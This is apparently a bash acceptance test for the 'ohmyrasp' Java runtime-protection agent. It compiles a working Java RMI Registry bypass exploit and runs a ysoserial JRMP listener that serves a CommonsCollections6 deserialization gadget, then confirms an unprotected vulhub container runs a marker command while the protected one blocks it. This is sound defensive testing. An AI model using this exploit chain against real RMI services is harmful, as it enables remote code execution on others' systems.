#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

image="${OHMYRASP_VULHUB_RMI_REGISTRY_BYPASS_IMAGE:-vulhub/j2ee:8u111}"
attack_image="${OHMYRASP_VULHUB_RMI_REGISTRY_BYPASS_ATTACK_IMAGE:-vulhub/j2ee:8u222}"
baseline_name="${OHMYRASP_VULHUB_RMI_REGISTRY_BYPASS_BASELINE_NAME:-ohmyrasp-vulhub-rmi-registry-bypass-baseline}"
protected_name="${OHMYRASP_VULHUB_RMI_REGISTRY_BYPASS_PROTECTED_NAME:-ohmyrasp-vulhub-rmi-registry-bypass-protected}"
listener_name="${OHMYRASP_VULHUB_RMI_REGISTRY_BYPASS_LISTENER_NAME:-ohmyrasp-vulhub-rmi-registry-bypass-listener}"
payload_dir="${OHMYRASP_YSOSERIAL_DIR:-/tmp/ohmyrasp-ysoserial}"
work_dir="${OHMYRASP_VULHUB_RMI_REGISTRY_BYPASS_WORKDIR:-/tmp/ohmyrasp-rmi-registry-bypass}"
jrmp_port="${OHMYRASP_VULHUB_RMI_REGISTRY_BYPASS_JRMP_PORT:-8888}"
success_file="/tmp/ohmyrasp-rmi-registry-bypass-success"
baseline_dir="logs/vulhub-rmi-registry-bypass-java8-baseline"
protected_dir="logs/vulhub-rmi-registry-bypass-java8-protected"
protected_log="${protected_dir}/events.jsonl"

copy_artifacts() {
  local name="$1"
  local dir="$2"
  local output="$3"
  if docker inspect "$name" >/dev/null 2>&1; then
    docker logs "$name" > "${dir}/${output}" 2>&1 || true
  fi
}

cleanup() {
  copy_artifacts "$baseline_name" "$baseline_dir" "container.log"
  copy_artifacts "$protected_name" "$protected_dir" "container.log"
  copy_artifacts "$listener_name" "$baseline_dir" "jrmp-listener.log"
  docker rm -f "$baseline_name" "$protected_name" "$listener_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

ensure_port_available() {
  local port="$1"
  if timeout 1 bash -c "</dev/tcp/127.0.0.1/${port}" >/dev/null 2>&1; then
    echo "host port ${port} is already in use; RMI Registry bypass acceptance uses host networking" >&2
    exit 1
  fi
}

prepare_ysoserial() {
  mkdir -p "$payload_dir"
  if [[ ! -s "${payload_dir}/ysoserial.jar" ]]; then
    rm -rf "${payload_dir}/src"
    docker run --rm -v "${payload_dir}:/work" -w /work maven:3.8.1-jdk-8 \
      bash -lc 'git clone --depth 1 https://github.com/frohoff/ysoserial.git src && cd src && mvn -q -DskipTests package && cp target/ysoserial-*-all.jar /work/ysoserial.jar'
  fi
}

prepare_exploit() {
  mkdir -p "$work_dir"
  docker run --rm -v "${work_dir}:/work" -w /work "$attack_image" \
    bash -lc 'rm -rf /work/* /work/.[!.]* /work/..?* 2>/dev/null || true; chmod 777 /work'
  mkdir -p "${work_dir}/src" "${work_dir}/classes"

  cat > "${work_dir}/src/RmiRegistryBypassExploit.java" <<'JAVA'
import java.io.IOException;
import java.io.Serializable;
import java.lang.reflect.Proxy;
import java.net.Socket;
import java.rmi.ConnectIOException;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RMIClientSocketFactory;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.RemoteRef;
import java.util.Random;
import javax.net.ssl.SSLSocketFactory;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

public class RmiRegistryBypassExploit {
    public static void main(String[] args) throws Exception {
        if (args.length != 4) {
            throw new IllegalArgumentException("usage: RmiRegistryBypassExploit <registryHost> <registryPort> <jrmpHost> <jrmpPort>");
        }

        Registry registry = LocateRegistry.getRegistry(args[0], Integer.parseInt(args[1]));
        try {
            registry.list();
        } catch (ConnectIOException exception) {
            registry = LocateRegistry.getRegistry(args[0], Integer.parseInt(args[1]), new RmiSslClientSocketFactory());
        }

        ObjID id = new ObjID(new Random().nextInt());
        TCPEndpoint endpoint = new TCPEndpoint(args[2], Integer.parseInt(args[3]));
        UnicastRef ref = new UnicastRef(new LiveRef(id, endpoint, false));
        Remote remote = (Remote) Proxy.newProxyInstance(
            RemoteRef.class.getClassLoader(),
            new Class<?>[] {Remote.class},
            new RemoteObjectInvocationHandler(ref));

        try {
            registry.bind("ohmyrasp" + System.nanoTime(), remote);
        } catch (Throwable expected) {
            expected.printStackTrace();
        }
    }

    public static final class RmiSslClientSocketFactory implements RMIClientSocketFactory, Serializable {
        private static final long serialVersionUID = 1L;

        public Socket createSocket(String host, int port) throws IOException {
            return SSLSocketFactory.getDefault().createSocket(host, port);
        }
    }
}
JAVA

  docker run --rm --entrypoint /bin/bash -v "${work_dir}:/work" -w /work "$attack_image" \
    -lc '/usr/local/openjdk-8/bin/javac -source 1.8 -target 1.8 -d classes src/RmiRegistryBypassExploit.java'
}

wait_for_port() {
  local name="$1"
  local port="$2"
  local dir="$3"
  local label="$4"
  for attempt in $(seq 1 60); do
    if timeout 1 bash -c "</dev/tcp/127.0.0.1/${port}" >/dev/null 2>&1; then
      printf '%s_ready_attempt=%s\n' "$label" "$attempt" >> "${dir}/attempts.log"
      return
    fi
    sleep 1
  done

  docker logs "$name" >&2 || true
  echo "${name} did not expose ${label} on ${port}" >&2
  exit 1
}

wait_for_protected_startup() {
  for attempt in $(seq 1 60); do
    if grep -Fq '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
      printf 'agent_start_attempt=%s\n' "$attempt" >> "${protected_dir}/attempts.log"
      return
    fi
    sleep 1
  done

  cat "$protected_log" >&2 || true
  docker logs "$protected_name" >&2 || true
  echo "missing Java8 agent startup event for RMI Registry bypass" >&2
  exit 1
}

start_listener() {
  local dir="$1"
  docker rm -f "$listener_name" >/dev/null 2>&1 || true
  docker run -d --name "$listener_name" --network host \
    -v "${payload_dir}:/work:ro" -w /work "$attack_image" \
    /bin/bash -lc "/usr/local/openjdk-8/bin/java -cp ysoserial.jar ysoserial.exploit.JRMPListener ${jrmp_port} CommonsCollections6 'touch ${success_file}'" \
    >/dev/null
  wait_for_port "$listener_name" "$jrmp_port" "$dir" "jrmp"
}

run_exploit() {
  local dir="$1"
  local output="${dir}/rmi-registry-bypass-client.log"
  local status

  set +e
  docker run --rm --network host --entrypoint /bin/bash \
    -v "${work_dir}/classes:/work:ro" -w /work "$attack_image" \
    -lc "/usr/local/openjdk-8/bin/java -cp /work RmiRegistryBypassExploit 127.0.0.1 1099 127.0.0.1 ${jrmp_port}" \
    > "$output" 2>&1
  status=$?
  set -e
  printf 'client_status=%s\n' "$status" >> "${dir}/attempts.log"
}

start_baseline() {
  docker run -d --name "$baseline_name" --network host \
    -e RMIIP=127.0.0.1 \
    "$image" >/dev/null
  wait_for_port "$baseline_name" 1099 "$baseline_dir" "registry"
}

start_protected() {
  docker run -d --name "$protected_name" --network host \
    -v "${host_agent_jar}:/tmp/ohmyrasp-agent-java8.jar:ro" \
    -v "$(pwd)/${protected_dir}:/tmp/ohmyrasp-logs" \
    -e RMIIP=127.0.0.1 \
    "$image" \
    bash -lc 'java -javaagent:/tmp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/tmp/ohmyrasp-logs/events.jsonl -Dohmyrasp.java8.block=true -Djdk.xml.enableTemplatesImplDeserialization=true -Djava.rmi.server.hostname=${RMIIP} -Djava.security.manager -Djava.security.policy=/root/client.policy -cp /root/train-1.0-SNAPSHOT-all.jar train.rmi.Server' \
    >/dev/null
  wait_for_port "$protected_name" 1099 "$protected_dir" "registry"
  wait_for_protected_startup
}

run_baseline() {
  start_baseline
  docker exec "$baseline_name" rm -f "$success_file"
  start_listener "$baseline_dir"
  run_exploit "$baseline_dir"

  for attempt in $(seq 1 15); do
    if docker exec "$baseline_name" test -e "$success_file"; then
      printf 'baseline_marker_attempt=%s\n' "$attempt" >> "${baseline_dir}/attempts.log"
      copy_artifacts "$baseline_name" "$baseline_dir" "container.log"
      copy_artifacts "$listener_name" "$baseline_dir" "jrmp-listener.log"
      docker rm -f "$baseline_name" "$listener_name" >/dev/null 2>&1 || true
      return
    fi
    sleep 1
  done

  docker logs "$baseline_name" >&2 || true
  docker logs "$listener_name" >&2 || true
  cat "${baseline_dir}/rmi-registry-bypass-client.log" >&2 || true
  echo "baseline RMI Registry bypass did not create ${success_file}" >&2
  exit 1
}

run_protected() {
  start_protected
  if grep -Fq '"event":"ohmyrasp-detection"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "protected RMI Registry bypass container produced a detection before exploit traffic" >&2
    exit 1
  fi

  docker exec "$protected_name" rm -f "$success_file"
  start_listener "$protected_dir"
  run_exploit "$protected_dir"
  sleep 3

  if docker exec "$protected_name" test -e "$success_file"; then
    echo "protected RMI Registry bypass created ${success_file} despite Java8 RASP" >&2
    exit 1
  fi
  if ! grep -Eq '"algorithm":"java8_deserialization_gadget_class".*"action":"block"' "$protected_log"; then
    cat "$protected_log" >&2 || true
    docker logs "$protected_name" >&2 || true
    docker logs "$listener_name" >&2 || true
    echo "missing java8_deserialization_gadget_class block event for RMI Registry bypass" >&2
    exit 1
  fi
  if ! grep -Fq '"class":"org.apache.commons.collections.functors.ChainedTransformer"' "$protected_log"; then
    cat "$protected_log" >&2 || true
    echo "RMI Registry bypass block event did not identify ChainedTransformer gadget class" >&2
    exit 1
  fi
}

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"
docker rm -f "$baseline_name" "$protected_name" "$listener_name" >/dev/null 2>&1 || true
ensure_port_available 1099
ensure_port_available "$jrmp_port"

prepare_ysoserial
prepare_exploit
run_baseline
ensure_port_available 1099
ensure_port_available "$jrmp_port"
run_protected

copy_artifacts "$protected_name" "$protected_dir" "container.log"
copy_artifacts "$listener_name" "$protected_dir" "jrmp-listener.log"
docker rm -f "$protected_name" "$listener_name" >/dev/null 2>&1 || true

echo "vulhub Java RMI Registry bypass Java8 acceptance passed"
